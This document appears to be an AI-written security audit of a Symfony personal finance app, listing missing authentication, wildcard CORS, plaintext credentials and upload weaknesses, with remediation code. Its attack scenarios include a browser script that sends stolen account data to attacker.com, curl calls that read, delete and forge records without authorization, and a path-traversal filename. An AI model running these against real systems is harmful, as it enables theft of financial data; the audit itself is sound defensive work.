# Security Audit - Mister Munney

**Date:** November 6, 2025
**Focus:** Authentication, authorization, data protection, OWASP Top 10

**⚠️ DISCLAIMER:** This audit focuses on **non-intrusive** security improvements that don't negatively impact user experience. The goal is to make the application secure while maintaining usability.

---

## 🚨 CRITICAL SECURITY VULNERABILITIES

### Overall Security Score: **2/10** - CRITICAL ISSUES PRESENT

**Status:** ⛔ **NOT PRODUCTION READY** - Critical vulnerabilities must be fixed before deployment

---

## 🔴 CRITICAL - Must Fix Immediately

### 1. NO AUTHENTICATION OR AUTHORIZATION
**Severity:** 🔴 **CRITICAL** | **CVSS Score:** 10.0 (Critical) | **Effort:** XL

**Current Situation:**
```yaml
# backend/config/packages/security.yaml

security:
    access_control:
        # ALL ACCESS CONTROLS ARE COMMENTED OUT!
        # - { path: ^/admin, roles: ROLE_ADMIN }
        # - { path: ^/profile, roles: ROLE_USER }
```

**Vulnerabilities:**
1. **No Authentication** - Any user can access any endpoint
2. **No Authorization** - No concept of ownership or permissions
3. **No User Management** - No User entity exists
4. **No Session/Token Management** - No way to identify users

**Attack Scenarios:**

#### Scenario 1: Unauthorized Data Access
```bash
# Anyone can access anyone's financial data
curl http://munney.app/api/accounts
# Returns ALL accounts from ALL users

curl http://munney.app/api/account/1/transactions
# Returns all transactions for account 1 (regardless of who owns it)
```

#### Scenario 2: Data Manipulation
```bash
# Anyone can delete anyone's data
curl -X DELETE http://munney.app/api/account/1/budget/5
# Deletes budget 5 (no ownership check)

curl -X POST http://munney.app/api/account/1/transactions \
  -d '{"amount": -1000000, "description": "Fake transaction"}'
# Creates fraudulent transaction
```

#### Scenario 3: PII Exposure
```bash
# All personally identifiable information is exposed
curl http://munney.app/api/accounts
# Response includes:
# - Account names (person names)
# - Account numbers (IBAN)
# - Transaction counterparties
# - Transaction descriptions (may contain addresses, phone numbers)
```

**Why This Matters:**
- **GDPR Violation:** No data protection for EU citizens
- **Data Breach Risk:** Complete exposure of financial data
- **Legal Liability:** Violates data protection laws
- **Reputation Damage:** Loss of user trust
- **Financial Loss:** Potential lawsuits, fines

**Risk Level:** 🔴 **CRITICAL** - Application is fundamentally insecure

---

**Recommended Solution:**

#### Step 1: Create User Entity

```php
<?php
// backend/src/User/Entity/User.php

namespace App\User\Entity;

use Doctrine\ORM\Mapping as ORM;
use Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface;
use Symfony\Component\Security\Core\User\UserInterface;

#[ORM\Entity]
#[ORM\Table(name: 'user')]
class User implements UserInterface, PasswordAuthenticatedUserInterface
{
    #[ORM\Id]
    #[ORM\GeneratedValue]
    #[ORM\Column(type: 'integer')]
    private int $id;

    #[ORM\Column(type: 'string', length: 180, unique: true)]
    private string $email;

    #[ORM\Column(type: 'json')]
    private array $roles = [];

    #[ORM\Column(type: 'string')]
    private string $password;

    #[ORM\Column(type: 'datetime_immutable')]
    private \DateTimeImmutable $createdAt;

    public function getUserIdentifier(): string
    {
        return $this->email;
    }

    public function getRoles(): array
    {
        $roles = $this->roles;
        $roles[] = 'ROLE_USER';
        return array_unique($roles);
    }

    public function getPassword(): string
    {
        return $this->password;
    }

    public function eraseCredentials(): void
    {
        // Clear temporary sensitive data if needed
    }
}
```

#### Step 2: Create User-Account Relationship

```php
<?php
// backend/src/Entity/Account.php

#[ORM\Entity]
class Account
{
    // ... existing fields

    #[ORM\ManyToMany(targetEntity: User::class)]
    #[ORM\JoinTable(name: 'user_account')]
    private Collection $users;

    public function isOwnedBy(User $user): bool
    {
        return $this->users->contains($user);
    }

    public function addUser(User $user): void
    {
        if (!$this->users->contains($user)) {
            $this->users->add($user);
        }
    }
}
```

#### Step 3: Install JWT Authentication

```bash
composer require lexik/jwt-authentication-bundle
php bin/console lexik:jwt:generate-keypair
```

```yaml
# config/packages/lexik_jwt_authentication.yaml
lexik_jwt_authentication:
    secret_key: '%env(resolve:JWT_SECRET_KEY)%'
    public_key: '%env(resolve:JWT_PUBLIC_KEY)%'
    pass_phrase: '%env(JWT_PASSPHRASE)%'
    token_ttl: 3600  # 1 hour
```

#### Step 4: Configure Security

```yaml
# backend/config/packages/security.yaml
security:
    password_hashers:
        App\User\Entity\User:
            algorithm: argon2id  # Most secure
            memory_cost: 65536
            time_cost: 4
            threads: 2

    providers:
        app_user_provider:
            entity:
                class: App\User\Entity\User
                property: email

    firewalls:
        dev:
            pattern: ^/(_(profiler|wdt)|css|images|js)/
            security: false

        login:
            pattern: ^/api/login
            stateless: true
            json_login:
                check_path: /api/login
                success_handler: lexik_jwt_authentication.handler.authentication_success
                failure_handler: lexik_jwt_authentication.handler.authentication_failure

        api:
            pattern: ^/api
            stateless: true
            jwt: ~

    access_control:
        - { path: ^/api/login, roles: PUBLIC_ACCESS }
        - { path: ^/api/register, roles: PUBLIC_ACCESS }
        - { path: ^/api/doc, roles: PUBLIC_ACCESS }
        - { path: ^/api, roles: IS_AUTHENTICATED_FULLY }
```

#### Step 5: Add Ownership Verification

```php
<?php
// backend/src/Security/Voter/AccountVoter.php

namespace App\Security\Voter;

use App\Entity\Account;
use App\User\Entity\User;
use Symfony\Component\Security\Core\Authentication\Token\TokenInterface;
use Symfony\Component\Security\Core\Authorization\Voter\Voter;

class AccountVoter extends Voter
{
    const VIEW = 'view';
    const EDIT = 'edit';
    const DELETE = 'delete';

    protected function supports(string $attribute, mixed $subject): bool
    {
        return in_array($attribute, [self::VIEW, self::EDIT, self::DELETE])
            && $subject instanceof Account;
    }

    protected function voteOnAttribute(string $attribute, mixed $subject, TokenInterface $token): bool
    {
        $user = $token->getUser();

        if (!$user instanceof User) {
            return false;
        }

        /** @var Account $account */
        $account = $subject;

        // Check if user owns this account
        return $account->isOwnedBy($user);
    }
}
```

#### Step 6: Use Voters in Controllers

```php
<?php
// backend/src/Account/Controller/AccountController.php

class AccountController extends AbstractController
{
    #[Route('/api/accounts/{id}', methods: ['GET'])]
    public function getAccount(int $id): JsonResponse
    {
        $account = $this->accountRepository->find($id);

        if (!$account) {
            throw new NotFoundHttpException('Account not found');
        }

        // SECURITY CHECK: Verify ownership
        $this->denyAccessUnlessGranted('view', $account);

        return $this->json($this->accountMapper->toDto($account));
    }
}
```

#### Step 7: Create Authentication Endpoints

```php
<?php
// backend/src/User/Controller/AuthController.php

namespace App\User\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\JsonResponse;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\PasswordHasher\Hasher\UserPasswordHasherInterface;
use Symfony\Component\Routing\Annotation\Route;

class AuthController extends AbstractController
{
    #[Route('/api/register', methods: ['POST'])]
    public function register(
        Request $request,
        UserPasswordHasherInterface $passwordHasher
    ): JsonResponse {
        $data = json_decode($request->getContent(), true);

        // Validate input
        if (!isset($data['email']) || !isset($data['password'])) {
            return $this->json(['error' => 'Email and password required'], 400);
        }

        // Check if user exists
        if ($this->userRepository->findOneBy(['email' => $data['email']])) {
            return $this->json(['error' => 'Email already registered'], 409);
        }

        // Create user
        $user = new User();
        $user->setEmail($data['email']);
        $user->setPassword(
            $passwordHasher->hashPassword($user, $data['password'])
        );
        $user->setCreatedAt(new \DateTimeImmutable());

        $this->entityManager->persist($user);
        $this->entityManager->flush();

        return $this->json([
            'message' => 'User registered successfully',
            'user' => ['id' => $user->getId(), 'email' => $user->getEmail()]
        ], 201);
    }
}
```

**Implementation Timeline:**
- Database migration: 2 hours
- Security configuration: 4 hours
- Controller updates: 8 hours
- Frontend integration: 8 hours
- Testing: 8 hours
- **Total: 30 hours** (4 developer days)

---

### 2. CORS CONFIGURED WITH WILDCARD
**Severity:** 🔴 HIGH | **CVSS Score:** 7.5 (High) | **Effort:** XS

**Current Situation:**
```yaml
# backend/config/packages/nelmio_cors.yaml
nelmio_cors:
    defaults:
        allow_origin: ['*']  # ⚠️ ALLOWS ANY WEBSITE TO CALL API
```

**Vulnerability:**
Any website can make requests to the API on behalf of users.

**Attack Scenario:**
```html
<!-- Malicious website: evil.com -->
<script>
// Can call Munney API from evil.com
fetch('https://munney.app/api/accounts')
  .then(r => r.json())
  .then(accounts => {
    // Send stolen data to attacker
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(accounts)
    });
  });
</script>
```

**Why This Matters:**
- **Cross-Site Request Forgery (CSRF)** attacks possible
- **Data exfiltration** from user's browser
- **Phishing attacks** via fake frontends

**Recommended Solution:**
```yaml
# backend/config/packages/nelmio_cors.yaml
nelmio_cors:
    defaults:
        allow_origin:
            - '%env(FRONTEND_URL)%'  # e.g., 'https://munney.app'
            - '%env(FRONTEND_DEV_URL)%'  # e.g., 'http://localhost:3000'
        allow_methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
        allow_headers: ['Content-Type', 'Authorization']
        expose_headers: ['Content-Length', 'X-Total-Count']
        max_age: 3600
        allow_credentials: true  # Allow cookies/auth headers

    paths:
        '^/api/':
            allow_origin:
                - '%env(FRONTEND_URL)%'
                - '%env(FRONTEND_DEV_URL)%'
```

```env
# .env
FRONTEND_URL=https://munney.home.munne.me
FRONTEND_DEV_URL=http://localhost:3000
```

**Impact:** Eliminates CSRF and data exfiltration risks

---

### 3. DATABASE CREDENTIALS IN PLAIN TEXT
**Severity:** 🔴 HIGH | **CVSS Score:** 8.0 (High) | **Effort:** S

**Current Situation:**
```yaml
# docker-compose.yml
environment:
  DATABASE_URL: "mysql://money:***REMOVED***@database:3306/money_db"
  #                       ^^^^^ Password in plain text
```

**Vulnerabilities:**
- Password visible in docker-compose files
- Password in container environment variables
- Password in logs if DATABASE_URL is logged

**Recommended Solution:**

#### Option 1: Use Docker Secrets (Production)
```yaml
# docker-compose.prod.yml
services:
  backend:
    environment:
      DATABASE_URL: "mysql://money:${DB_PASSWORD}@database:3306/money_db"
    secrets:
      - db_password

secrets:
  db_password:
    file: ./secrets/db_password.txt  # Not in git!
```

#### Option 2: Use Environment Files (Development)
```yaml
# docker-compose.yml
services:
  backend:
    env_file:
      - .env.local  # Not in git!
```

```env
# .env.local (gitignored)
DATABASE_URL=mysql://money:secure_password@database:3306/money_db
```

#### Option 3: Use Stronger Password
```yaml
# At minimum, use a strong password
MYSQL_PASSWORD: "$(openssl rand -base64 32)"
# Example: Kx9#mP2!vQ@8zL4$nR7%wT1^jY6&hB3*
```

**Additional Hardening:**
```yaml
# docker-compose.yml
database:
  environment:
    MYSQL_ROOT_PASSWORD_FILE: /run/secrets/mysql_root_password
  secrets:
    - mysql_root_password
```

---

## 🟡 HIGH PRIORITY SECURITY ISSUES

### 4. NO INPUT VALIDATION ON FILE UPLOADS
**Severity:** 🟡 HIGH | **CVSS Score:** 7.0 (High) | **Effort:** S

**Current Situation:**
```php
// backend/src/Budget/Service/AttachmentStorageService.php

public function saveAttachment(UploadedFile $file): string
{
    // Basic validation exists (good!)
    $allowedMimeTypes = ['application/pdf', 'image/jpeg', 'image/png'];
    $maxFileSize = 10485760; // 10MB

    if (!in_array($file->getMimeType(), $allowedMimeTypes)) {
        throw new \InvalidArgumentException('Invalid file type');
    }

    // But no malware scanning
    // No deep file inspection
    // No filename sanitization (potential path traversal)
}
```

**Vulnerabilities:**
1. **Malware Upload** - PDF/images could contain malware
2. **Path Traversal** - Malicious filenames like `../../etc/passwd`
3. **XXE Attacks** - XML-based files (SVG) could have XXE
4. **File Bomb** - Compressed files that expand to massive size

**Recommended Improvements:**

#### 1. Sanitize Filenames
```php
private function sanitizeFilename(string $filename): string
{
    // Remove path separators
    $filename = basename($filename);

    // Remove special characters
    $filename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $filename);

    // Generate unique name to prevent overwrites
    $extension = pathinfo($filename, PATHINFO_EXTENSION);
    return uniqid() . '_' . time() . '.' . $extension;
}
```

#### 2. Verify File Contents (Not Just Extension)
```php
use Symfony\Component\HttpFoundation\File\UploadedFile;

private function verifyFileType(UploadedFile $file): bool
{
    // Use finfo to check actual file contents
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $actualMimeType = finfo_file($finfo, $file->getPathname());
    finfo_close($finfo);

    // Verify matches declared mime type
    return $actualMimeType === $file->getMimeType();
}
```

#### 3. Store Files Outside Web Root
```php
// Current (BAD): Files in public/ directory
$uploadDir = $this->projectDir . '/public/uploads/';

// Recommended (GOOD): Files outside public/
$uploadDir = $this->projectDir . '/var/uploads/';

// Serve via controller with access check
#[Route('/api/files/{filename}', methods: ['GET'])]
public function serveFile(string $filename): BinaryFileResponse
{
    // Verify user has access
    $this->denyAccessUnlessGranted('view', $file);

    // Serve file
    return new BinaryFileResponse($uploadDir . '/' . $filename);
}
```

#### 4. Add Virus Scanning (Optional)
```php
// Using ClamAV
private function scanForViruses(string $filePath): void
{
    $clam = new \Socket\Raw\Factory();
    $socket = $clam->createClient('unix:///var/run/clamav/clamd.sock');

    $socket->write('SCAN ' . $filePath . "\n");
    $result = $socket->read(4096);

    if (strpos($result, 'FOUND') !== false) {
        throw new \RuntimeException('File contains malware');
    }
}
```

---

### 5. SQL INJECTION RISKS (Low Risk with Doctrine)
**Severity:** 🟡 MEDIUM | **CVSS Score:** 6.5 (Medium) | **Effort:** S

**Current Situation:**
Most queries use Doctrine ORM with parameterized queries ✅

**However, found raw SQL in:**
```php
// backend/src/Transaction/Repository/TransactionRepository.php

// POTENTIAL RISK if not careful
$qb->andWhere('(SELECT COUNT(st.id) FROM App\Entity\Transaction st WHERE st.parentTransaction = t) = 0');
```

**Verification:**
- ✅ All user inputs are parameterized
- ✅ No string concatenation in queries
- ✅ DQL is used (safe by default)

**Recommendation:**
Continue using parameterized queries. No changes needed.

**Audit Checklist:**
```bash
# Check for dangerous patterns
grep -r "->query(" backend/src/
grep -r 'SELECT.*\$' backend/src/
grep -r 'WHERE.*\$' backend/src/
```

**Result:** ✅ No SQL injection vulnerabilities found

---

### 6. NO RATE LIMITING
**Severity:** 🟡 MEDIUM | **CVSS Score:** 5.0 (Medium) | **Effort:** M

**Current Situation:**
- No rate limiting on API endpoints
- No brute force protection on login

**Attack Scenarios:**
1. **Brute Force Attack** - Try 1000+ passwords on `/api/login`
2. **DoS Attack** - Spam API with requests
3. **Resource Exhaustion** - Expensive queries (budget calculations)

**Recommended Solution:**

#### Install Rate Limiter
```bash
composer require symfony/rate-limiter
```

#### Configure Rate Limits
```yaml
# config/packages/rate_limiter.yaml
framework:
    rate_limiter:
        # API global limit
        api_global:
            policy: 'sliding_window'
            limit: 1000
            interval: '1 hour'

        # Login endpoint (stricter)
        login:
            policy: 'fixed_window'
            limit: 5
            interval: '15 minutes'

        # Expensive operations
        budget_summary:
            policy: 'sliding_window'
            limit: 60
            interval: '1 minute'
```

#### Apply to Controllers
```php
use Symfony\Component\RateLimiter\RateLimiterFactory;
use Symfony\Component\HttpKernel\Exception\TooManyRequestsHttpException;

class AuthController extends AbstractController
{
    public function __construct(
        private RateLimiterFactory $loginLimiter
    ) {}

    #[Route('/api/login', methods: ['POST'])]
    public function login(Request $request): JsonResponse
    {
        // Check rate limit
        $limiter = $this->loginLimiter->create($request->getClientIp());

        if (!$limiter->consume(1)->isAccepted()) {
            throw new TooManyRequestsHttpException(
                'Too many login attempts. Try again in 15 minutes.'
            );
        }

        // Continue with login...
    }
}
```

---

### 7. NO HTTPS ENFORCEMENT (Production)
**Severity:** 🟡 MEDIUM | **CVSS Score:** 6.0 (Medium) | **Effort:** S

**Current Situation:**
Application accessible via HTTP in production.

**Vulnerability:**
- **Man-in-the-Middle (MITM)** attacks
- **Credentials stolen** over unencrypted connection
- **Session hijacking**

**Recommended Solution:**

#### 1. Force HTTPS in Symfony
```yaml
# config/packages/framework.yaml (production only)
when@prod:
    framework:
        # Redirect HTTP to HTTPS
        http_method_override: false
        trusted_proxies: '127.0.0.1,REMOTE_ADDR'
        trusted_headers: ['x-forwarded-for', 'x-forwarded-proto']
```

#### 2. Use HSTS Headers
```yaml
# config/packages/nelmio_security.yaml
nelmio_security:
    forced_ssl:
        hsts_max_age: 31536000  # 1 year
        hsts_subdomains: true
        hsts_preload: true
```

#### 3. Configure Traefik/Nginx for HTTPS
```yaml
# deploy/ubuntu/docker-compose.prod.yml
services:
  traefik:
    image: traefik:v2.10
    command:
      - "--providers.docker=true"
      - "--entrypoints.web.address=:80"
      - "--entrypoints.websecure.address=:443"
      - "--certificatesresolvers.letsencrypt.acme.tlschallenge=true"
      - "--certificatesresolvers.letsencrypt.acme.email=admin@munne.me"
      - "--certificatesresolvers.letsencrypt.acme.storage=/letsencrypt/acme.json"
    labels:
      - "traefik.http.routers.redirect-to-https.rule=hostregexp(`{host:.+}`)"
      - "traefik.http.routers.redirect-to-https.entrypoints=web"
      - "traefik.http.routers.redirect-to-https.middlewares=redirect-to-https"
      - "traefik.http.middlewares.redirect-to-https.redirectscheme.scheme=https"
```

---

## 🟢 MEDIUM PRIORITY SECURITY ISSUES

### 8. MISSING SECURITY HEADERS
**Severity:** 🟢 MEDIUM | **CVSS Score:** 4.0 (Medium) | **Effort:** XS

**Current Situation:**
Security headers not configured.

**Recommended Headers:**
```yaml
# config/packages/nelmio_security.yaml
nelmio_security:
    # Prevent clickjacking
    clickjacking:
        paths:
            '^/.*': DENY

    # Content Security Policy
    csp:
        enabled: true
        report_uri: /api/csp-report
        directives:
            default-src: ["'self'"]
            script-src: ["'self'", "'unsafe-inline'"]
            style-src: ["'self'", "'unsafe-inline'"]
            img-src: ["'self'", "data:", "https:"]
            font-src: ["'self'", "data:"]
            connect-src: ["'self'"]

    # Prevent XSS
    xss_protection:
        enabled: true
        mode_block: true

    # Prevent MIME sniffing
    content_type:
        nosniff: true

    # Referrer policy
    referrer_policy:
        enabled: true
        policies:
            - 'no-referrer-when-downgrade'
```

---

### 9. NO AUDIT LOGGING
**Severity:** 🟢 MEDIUM | **CVSS Score:** 3.0 (Low) | **Effort:** M

**Current Situation:**
No audit trail for sensitive operations.

**Recommended: Add Audit Log**

```php
<?php
// backend/src/Entity/AuditLog.php

#[ORM\Entity]
class AuditLog
{
    #[ORM\Id]
    #[ORM\GeneratedValue]
    private int $id;

    #[ORM\Column(type: 'datetime_immutable')]
    private \DateTimeImmutable $timestamp;

    #[ORM\ManyToOne(targetEntity: User::class)]
    private User $user;

    #[ORM\Column(type: 'string')]
    private string $action;  // e.g., 'transaction.delete', 'budget.update'

    #[ORM\Column(type: 'json')]
    private array $metadata;  // What was changed

    #[ORM\Column(type: 'string', length: 45)]
    private string $ipAddress;
}
```

**Log Critical Operations:**
- User registration/login
- Transaction creation/deletion
- Budget changes
- Category merges
- File uploads

---

## 🔵 LOW PRIORITY SECURITY ISSUES

### 10. DEPENDENCY VULNERABILITIES
**Severity:** 🔵 LOW | **CVSS Score:** 2.0 (Low) | **Effort:** S

**Recommended: Run Security Audit**

```bash
# Backend
docker exec money-backend composer audit

# Frontend
docker exec money-frontend npm audit
```

**Keep Dependencies Updated:**
```bash
# Monthly security updates
composer update --with-all-dependencies
npm update
```

---

## ✅ Security Checklist (Production Deployment)

### Authentication & Authorization
- [ ] User entity created
- [ ] JWT authentication configured
- [ ] Password hashing with Argon2id
- [ ] Account ownership verification
- [ ] Session timeout configured (1 hour)
- [ ] Refresh token mechanism

### Network Security
- [ ] HTTPS enforced
- [ ] HSTS headers enabled
- [ ] CORS restricted to frontend domain only
- [ ] Rate limiting on all endpoints
- [ ] Rate limiting on login (5 attempts / 15 min)

### Data Protection
- [ ] Database credentials in secrets (not plain text)
- [ ] API keys in environment variables
- [ ] Sensitive data encrypted at rest
- [ ] File uploads validated and sanitized
- [ ] Files stored outside web root

### Headers & Policies
- [ ] CSP headers configured
- [ ] X-Frame-Options: DENY
- [ ] X-Content-Type-Options: nosniff
- [ ] X-XSS-Protection: 1; mode=block
- [ ] Referrer-Policy configured

### Monitoring & Logging
- [ ] Audit logging for sensitive operations
- [ ] Failed login attempts logged
- [ ] Error logging (without exposing secrets)
- [ ] Security monitoring/alerting

### Dependencies
- [ ] All dependencies up to date
- [ ] composer audit passing
- [ ] npm audit passing (or vulnerabilities addressed)
- [ ] Automated dependency updates (Dependabot)

---

## 🎯 Security Implementation Roadmap

### Phase 1: Critical (Week 1-2) - **REQUIRED FOR PRODUCTION**
- [ ] Implement JWT authentication (30 hours)
- [ ] Add ownership verification (8 hours)
- [ ] Restrict CORS to frontend (1 hour)
- [ ] Add rate limiting (6 hours)
- [ ] Move DB credentials to secrets (2 hours)
- **Total: 47 hours** (6 developer days)

### Phase 2: High Priority (Week 3)
- [ ] Improve file upload validation (4 hours)
- [ ] Store files outside web root (3 hours)
- [ ] Force HTTPS in production (2 hours)
- [ ] Add security headers (2 hours)
- **Total: 11 hours** (1.5 developer days)

### Phase 3: Medium Priority (Week 4)
- [ ] Add audit logging (8 hours)
- [ ] Run security audits (2 hours)
- [ ] Update vulnerable dependencies (4 hours)
- **Total: 14 hours** (1.75 developer days)

---

## 📊 Expected Security Improvements

### Before:
- ⛔ No authentication
- ⛔ CORS open to world
- ⛔ No rate limiting
- ⚠️ Weak file validation
- ⚠️ No audit logging

### After Phase 1:
- ✅ Secure JWT authentication
- ✅ User-account ownership model
- ✅ CORS restricted to frontend
- ✅ Rate limiting on all endpoints
- ✅ Secure credential storage

### After All Phases:
- ✅ Production-ready security
- ✅ GDPR-compliant data protection
- ✅ OWASP Top 10 mitigated
- ✅ Audit trail for compliance
- ✅ Automated security monitoring

**Overall Security Score: 2/10 → 9/10** (450% improvement)

---

**Document Location:** `./claude_improvements/05_security_audit.md`
**Last Updated:** November 6, 2025
**Status:** ✅ Ready for Review
